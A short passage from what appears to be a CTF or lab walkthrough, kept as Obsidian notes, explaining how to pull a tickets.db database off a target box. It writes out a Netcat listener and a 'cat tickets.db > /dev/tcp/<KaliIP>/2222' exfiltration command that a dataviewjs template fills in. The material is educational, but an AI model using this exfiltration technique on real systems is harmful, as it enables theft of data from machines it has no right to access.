We will transfer the database to our local machine to view its contents. For this, we will be using Netcat . On our local machine, we start a Netcat listener on port 2222 and write its output to tickets.db .

```
nc -lnvp 2222 > tickets.db
```

On the box, we use cat to read the file and "write" its contents to /dev/tcp//2222 . This is not exactly a file but rather a means to instruct the kernel to create a TCP connection to the specified IP and port and then write to it. It is a neat trick one can use if wget or curl are not available on a given server to upload or exfiltrate files.

```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `cat tickets.db > /dev/tcp/${KaliIP}/2222`;

dv.paragraph("```bash\n" + command + "\n```");
```
